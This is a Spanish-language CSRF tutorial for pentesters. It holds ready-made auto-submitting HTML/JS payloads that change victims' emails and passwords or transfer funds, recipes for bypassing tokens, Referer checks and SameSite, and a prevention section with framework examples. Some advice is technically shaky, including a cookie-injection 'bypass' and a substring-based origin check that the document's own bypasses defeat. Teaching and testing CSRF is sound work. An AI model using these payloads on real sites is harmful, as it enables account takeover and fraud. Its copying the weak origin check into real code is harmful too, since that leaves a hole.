# Cross-Site Request Forgery (CSRF)

## ¿Qué es CSRF?

CSRF es un ataque que fuerza a un usuario autenticado a ejecutar acciones no deseadas en una aplicación web en la que está autenticado actualmente.

## Cómo Funciona

```
1. Víctima autenticada en vulnerable.com
2. Atacante envía link malicioso a la víctima
3. Víctima hace clic
4. Request se envía a vulnerable.com con las cookies de la víctima
5. Acción se ejecuta sin consentimiento de la víctima
```

## Ejemplos de CSRF

### GET-based CSRF
```html
<!-- Cambiar email del usuario -->
<img src="http://vulnerable.com/change-email?email=attacker@evil.com">

<!-- Transferencia de dinero -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

<!-- Eliminar cuenta -->
<iframe src="http://vulnerable.com/delete-account"></iframe>
```

### POST-based CSRF
```html
<!-- Form invisible que se auto-envía -->
<html>
<body onload="document.forms[0].submit()">
<form action="http://vulnerable.com/change-password" method="POST">
    <input type="hidden" name="password" value="hacked123">
    <input type="hidden" name="confirm" value="hacked123">
</form>
</body>
</html>
```

### JSON-based CSRF
```html
<script>
fetch('http://vulnerable.com/api/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

## Testing para CSRF

### 1. Identificar funcionalidades críticas
- Cambio de email
- Cambio de contraseña
- Transferencia de fondos
- Cambio de permisos
- Eliminación de cuenta
- Cualquier acción privilegiada

### 2. Interceptar request
Usar Burp Suite o proxy similar:
```http
POST /change-email HTTP/1.1
Host: vulnerable.com
Cookie: session=abc123

email=newemail@example.com
```

### 3. Verificar protecciones CSRF
Buscar:
- CSRF tokens
- Origin/Referer headers validation
- SameSite cookie attribute
- Custom headers

### 4. Crear PoC
```html
<html>
<body>
<h1>Haz clic aquí para ganar un iPhone!</h1>
<form id="csrf" action="http://vulnerable.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

## Bypass de Protecciones

### Bypass CSRF Token

#### Token no validado en servidor
```html
<!-- Simplemente remover el token -->
<form action="http://vulnerable.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- Token removido -->
</form>
```

#### Token no vinculado a sesión
```html
<!-- Usar token válido de tu propia sesión -->
<form action="http://vulnerable.com/change-email" method="POST">
    <input type="hidden" name="csrf_token" value="tu_token_valido">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

#### Token en cookie
```javascript
// Si el token está en una cookie, puede ser leído
document.cookie = "csrf_token=token_valido";
```

#### Token duplicado en cookie y parámetro
```html
<form action="http://vulnerable.com/change-email" method="POST">
    <input type="hidden" name="csrf_token" value="abc123">
</form>
<script>
document.cookie = "csrf_token=abc123";
document.forms[0].submit();
</script>
```

### Bypass Referer/Origin Header

#### Referer validation débil
```
Validación: Referer debe contener "vulnerable.com"

Bypass:
http://attacker.com/vulnerable.com.html
http://vulnerable.com.attacker.com
```

#### Remover Referer header
```html
<meta name="referrer" content="no-referrer">
<img src="http://vulnerable.com/change-email?email=attacker@evil.com">
```

#### Bypass Origin header
Si solo valida si el header existe pero acepta si no está presente:
```html
<!-- En algunos contextos el Origin no se envía -->
<iframe src="data:text/html,<script>
fetch('http://vulnerable.com/api/action', {
    method: 'POST',
    credentials: 'include',
    body: 'action=delete'
});
</script>"></iframe>
```

### Bypass SameSite Cookie

#### SameSite=Lax (default en navegadores modernos)
```html
<!-- GET requests funcionan con SameSite=Lax -->
<img src="http://vulnerable.com/action?param=value">

<!-- POST desde form con user interaction -->
<form action="http://vulnerable.com/action" method="POST">
    <input type="submit" value="Ganar premio!">
</form>
```

#### SameSite=None
```html
<!-- Cualquier request funciona -->
<form action="http://vulnerable.com/action" method="POST">
    <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit();</script>
```

## Herramientas

### Burp Suite
```
1. Intercept request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test in browser
4. Modify as needed
```

### CSRF Tester
```bash
# Generar PoC automáticamente
python csrf-poc-generator.py -u "http://vulnerable.com/action" -d "param=value"
```

### Manual PoC Template
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form id="csrf-form" action="http://vulnerable.com/action" method="POST">
        <input type="hidden" name="param1" value="value1">
        <input type="hidden" name="param2" value="value2">
        <input type="submit" value="Submit Request">
    </form>
    <!-- Auto-submit (optional) -->
    <script>
        // Uncomment to auto-submit
        // document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

## Prevención

### 1. CSRF Tokens (Mejor práctica)

#### Generación
```php
// PHP
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

```python
# Python/Flask
from flask import session
import secrets

if 'csrf_token' not in session:
    session['csrf_token'] = secrets.token_hex(32)
```

#### Uso en form
```html
<form action="/change-email" method="POST">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="email" name="email">
    <input type="submit" value="Change Email">
</form>
```

#### Validación
```php
// PHP
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token mismatch');
}
```

### 2. SameSite Cookie Attribute
```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

```
SameSite=Strict: Cookie no se envía en requests cross-site
SameSite=Lax: Cookie se envía en GET top-level navigation
SameSite=None: Cookie se envía siempre (requiere Secure)
```

### 3. Double Submit Cookie
```javascript
// Generar token y guardarlo en cookie y form
const csrfToken = generateToken();
document.cookie = `csrf_token=${csrfToken}`;

// En el servidor, verificar que coincidan
if (req.cookies.csrf_token !== req.body.csrf_token) {
    return res.status(403).send('CSRF validation failed');
}
```

### 4. Custom Headers
```javascript
// Cliente
fetch('/api/action', {
    method: 'POST',
    headers: {
        'X-Custom-Header': 'value',
        'Content-Type': 'application/json'
    },
    credentials: 'include',
    body: JSON.stringify({data: 'value'})
});

// Servidor
if (!req.headers['x-custom-header']) {
    return res.status(403).send('Missing custom header');
}
```

### 5. Referer/Origin Validation
```javascript
// Node.js/Express
app.use((req, res, next) => {
    const origin = req.headers.origin || req.headers.referer;
    const allowedOrigins = ['https://mysite.com'];
    
    if (req.method !== 'GET') {
        if (!origin || !allowedOrigins.some(o => origin.includes(o))) {
            return res.status(403).send('Invalid origin');
        }
    }
    next();
});
```

### 6. Re-authentication para acciones críticas
```javascript
// Requerir password para cambios críticos
if (action === 'delete_account' || action === 'transfer_funds') {
    if (!verifyPassword(req.body.password)) {
        return res.status(403).send('Password required');
    }
}
```

### 7. CAPTCHA
```html
<!-- Para acciones muy sensibles -->
<form action="/transfer" method="POST">
    <!-- campos del form -->
    <div class="g-recaptcha" data-sitekey="your_site_key"></div>
    <input type="submit">
</form>
```

## Framework Protection

### Django
```python
# Automáticamente protegido
# Template
{% csrf_token %}

# View
from django.views.decorators.csrf import csrf_protect

@csrf_protect
def my_view(request):
    pass
```

### Laravel
```php
<!-- Blade template -->
@csrf

<!-- O manualmente -->
<input type="hidden" name="_token" value="{{ csrf_token() }}">
```

### Express.js
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/process', csrfProtection, (req, res) => {
    res.send('Data processed');
});
```

### Spring (Java)
```java
// Automáticamente habilitado en Spring Security
// Deshabilitar para API stateless:
http.csrf().disable();
```

## Impacto

### Según la funcionalidad afectada:

**Crítico:**
- Cambio de contraseña
- Transferencia de fondos
- Cambio de email (si permite password reset)
- Eliminación de cuenta
- Cambio de roles/permisos

**Alto:**
- Publicar contenido
- Cambiar configuraciones
- Agregar/eliminar usuarios

**Medio:**
- Modificar perfil
- Cambiar preferencias

## Checklist de Testing

- [ ] Identificar funcionalidades que cambian estado
- [ ] Verificar si hay CSRF token
- [ ] Intentar remover CSRF token
- [ ] Intentar usar CSRF token de otra sesión
- [ ] Verificar validación de Origin/Referer
- [ ] Verificar SameSite cookie attribute
- [ ] Probar con método HTTP diferente (POST→GET)
- [ ] Crear PoC funcional
- [ ] Documentar impacto
- [ ] Verificar si funciona en navegadores modernos

## Notas Importantes

> [!WARNING]
> **Consideraciones:**
> - CSRF requiere que la víctima esté autenticada
> - No permite leer respuesta (solo ejecutar acción)
> - Navegadores modernos tienen protecciones (SameSite cookies)
> - Siempre prueba en navegadores actualizados

> [!TIP]
> **Tips para testing:**
> - Prueba en diferentes navegadores
> - Verifica si la app es cross-origin
> - Documenta los pasos exactos de reproducción
> - Incluye PoC funcional en tu reporte
> - Considera el impacto real del ataque

## Referencias

- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [MDN SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
